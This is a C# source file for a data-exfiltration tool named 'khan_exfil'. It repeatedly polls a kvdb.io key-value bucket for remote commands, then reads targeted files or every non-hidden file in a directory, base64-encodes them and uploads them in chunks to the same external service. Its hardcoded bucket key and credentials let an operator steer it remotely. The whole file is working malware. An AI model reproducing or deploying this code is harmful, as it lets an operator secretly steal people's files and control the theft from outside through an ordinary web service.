using System;
using System.Security.Cryptography;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Linq; 
using System.Net;
using System.Threading; 

public class khan_exfil
{
	public string PostRequestJson(string endpoint, string json)
	{
    		
			Console.WriteLine("(2) End point is : " +endpoint);
    		string jsonResponse = string.Empty;
 
    		using (var client = new WebClient())
    		{
       		 try
        		{
            		client.UseDefaultCredentials = true;
            		client.Headers.Add("Content-Type: application/x-www-form-urlencoded");
            		client.Headers.Add("Accept: */*");
					string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("Lovelygate002@" + ":" + "password"));
					client.Headers.Add("Authorization: "+string.Format("Basic {0}", credentials));
            		var uri = new Uri(endpoint);
           		    var response = client.UploadString(uri, "POST", json);
            		jsonResponse = response;
					Console.WriteLine("Chunk written");
					WebHeaderCollection myWebHeaderCollection = client.ResponseHeaders;
       			 }
        	catch (WebException ex)
        		{
            		
            		if (ex.Status == WebExceptionStatus.ProtocolError)
            		{
						 string response = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
						 Console.WriteLine("Error is :" +response);
						HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
						var statusCode = (int)wrsp.StatusCode;
						var msg = wrsp.StatusDescription;
						Console.WriteLine("Exception : " + msg + wrsp.StatusCode);
						return msg;
               		
            		}
            		else
            		{
                		Console.WriteLine("Exception 11" + ex.Message);
						return ex.Message;
            		}
        		}
    		}
 
   		 return jsonResponse;
	}
	public string WriteInChunks(string input, int maxChunkSize,string filename,string master)
		{
			try
			{
				khan_exfil obj=new khan_exfil();
				string res="FQM3hbtRhm94tkaLXBm5kF"; 
				string res_key=res;
				
				int index=0;
				int counter=0;
				while (index < input.Length)
				{
				string updated_ep="https://kvdb.io/"+res_key+"/"+filename+"_"+counter.ToString();
				master+=filename+"_"+counter.ToString()+",";
				int size = Math.Min(input.Length-index, maxChunkSize);
				string chunk=input.Substring(index, size);
				index += size;
				var res1=obj.PostRequestJson(updated_ep,chunk);
				counter ++;
				
				}
				return master;
			}
			catch(Exception ex)
			{
				Console.WriteLine("Exception while posting : " +ex.Message);
				return "0";
			}
		}
    public void exfil(string path,string file_details)
	{
		try
        {
			khan_exfil obj=new khan_exfil();
			int i=0;
			Console.WriteLine("(1) No exception till now");
			//System.IO.DirectoryInfo dirInf = new System.IO.DirectoryInfo(@"C:\myDir\Documents");
			//var files = dirInf.GetFiles("*.doc").Where(f => (f.Attributes & System.IO.FileAttributes.Hidden) != System.IO.FileAttributes.Hidden).ToArray();
            System.IO.DirectoryInfo dirInf ;
			Console.WriteLine("(2) No exception till now");
			string master_files="";
			List <System.IO.FileInfo> files = new List <System.IO.FileInfo>();
			//var files = dirInf.GetFiles(@"C:\test", "*.doc").Where(file=> file.EndsWith(".doc", StringComparison.CurrentCultureIgnoreCase)).ToArray();//If you want an array back
			if (file_details.Equals("") ==true)
			{
				Console.WriteLine("(a) In if = file path" +path);
				System.IO.FileInfo f=new System.IO.FileInfo(path);
				files.Add(f);
				Console.WriteLine("Length :" +files.Count.ToString());
			}
			else
			{
				dirInf = new System.IO.DirectoryInfo(@path);
				files = dirInf.GetFiles(file_details).Where(f => (f.Attributes & System.IO.FileAttributes.Hidden) != System.IO.FileAttributes.Hidden).ToArray().ToList();
			}
			
			 foreach (System.IO.FileInfo fi in files)
			{
				Console.WriteLine("(x) In file loop !");
				master_files+=fi.Name+","+fi.Extension+",";
				Console.WriteLine("{0}: {1}: {2} : {3}", fi.Name, fi.LastAccessTime, fi.Length , fi.DirectoryName);
				byte[] bytes = System.IO.File.ReadAllBytes(fi.DirectoryName+"\\"+fi.Name);
		
				File.WriteAllBytes("Khan"+i.ToString()+fi.Extension, bytes);
				string hex = BitConverter.ToString(bytes);
			
				File.WriteAllText("Khan_hex"+i.ToString()+".txt", hex);
				string base64 = Convert.ToBase64String(bytes);
				File.WriteAllText("Khan_b64"+i.ToString()+".txt", base64);
				byte[] bytes_ = System.Convert.FromBase64String(base64);
				File.WriteAllBytes("Khan_back"+i.ToString()+fi.Extension, bytes_);
				i++;
				master_files=obj.WriteInChunks(base64,1000000,fi.Name,master_files); //1000k = 1mb
				if(master_files.Equals("0") ==false) 
				{
				master_files+="***###***";
				}
				else
				{
					Console.WriteLine("Some error occured : Exiting ");
					return;
				}
			}
			
				string res="FQM3hbtRhm94tkaLXBm5kF";
				string updated_ep="https://kvdb.io/"+res+"/master_files";
				var res1=obj.PostRequestJson(updated_ep,master_files);
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine("Exception Unauth :  " +ex.Message);
        }
        catch (Exception ex)
        {
            Console.WriteLine("(1) Exception General : " + ex.Message);
        }
	}
	public string getData(string endpoint)
	{
		using (var client = new WebClient())
		{
   			 try
    			{
			Console.WriteLine("(1) End point is : " +endpoint);
        		client.BaseAddress = endpoint;
        		client.UseDefaultCredentials = true;
				string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("password" + ":" + "password"));
        		var jsonResponse = client.DownloadString(endpoint);
				return jsonResponse;
    			}
   			 catch (WebException ex)
    			{
       			
            		if (ex.Status == WebExceptionStatus.ProtocolError)
            		{
               		 	HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
                		var statusCode = (int)wrsp.StatusCode;
                		var msg = wrsp.StatusDescription;
						Console.WriteLine("Exception : " + msg);
						return "0";
               			
            		}
            		else
					{
                		Console.WriteLine("Exception 11" + ex.Message);
						return "0";
            		}
				}
			catch(Exception ex)
			{
				Console.WriteLine("Genera; Exception " + ex.Message);
				return "0";
			}
	}
	
 
	}
	public static void Main(string[] args)
	{
			khan_exfil obj=new khan_exfil();
			
				while(true)
				{
				try
				{
				int sleepfor = 5000;
				Thread.Sleep(sleepfor);
				string res="FQM3hbtRhm94tkaLXBm5kF"; 
				string res_key=res;
				string updated_ep="https://kvdb.io/"+res_key+"/file_commands";
				var resp2=obj.getData(updated_ep);
				string new_command="";
				if ((resp2.Equals("0") == false) && (resp2.Equals("") == false))
				{
					string []command_details=resp2.Split(',');
					string command_type=command_details[0];
					
					if(command_type.Equals("exfil"))
					{
						Console.WriteLine("(a) Path is : " +command_details[2]);
						string type=command_details[1];
						if(type=="path")
						{
							
							if (command_details[4].Equals("1"))
							{
								new_command=command_details[0]+","+command_details[1]+","+command_details[2]+","+command_details[3]+","+"0";
								var res1=obj.PostRequestJson(updated_ep,new_command);
								Console.WriteLine("Updated Resp : " +res1);
								obj.exfil(command_details[2],command_details[3]);
							}
							else
							{
								Console.WriteLine("(1) Pass no new command");
							}
						
						}
						else if (type=="file")
						{
							
							if (command_details[3].Equals("1"))
							{
								new_command=command_details[0]+","+command_details[1]+","+command_details[2]+","+"0";
								var res1=obj.PostRequestJson(updated_ep,new_command);
								Console.WriteLine("Updated Resp : " +res1);
								obj.exfil(command_details[2],"");
							}
							else
							{
								Console.WriteLine("(2) Pass no new command");
							}
							
						}
						else
						{
							Console.WriteLine("(b) Invalid path");
						}
					}
				}
				Console.WriteLine("Resp obtained : "+resp2);
				}
				catch(Exception ex)
				{
					Console.WriteLine("Exception : " +ex.Message);
					//sw.Write(ex.Message);
				}
				}
	}
}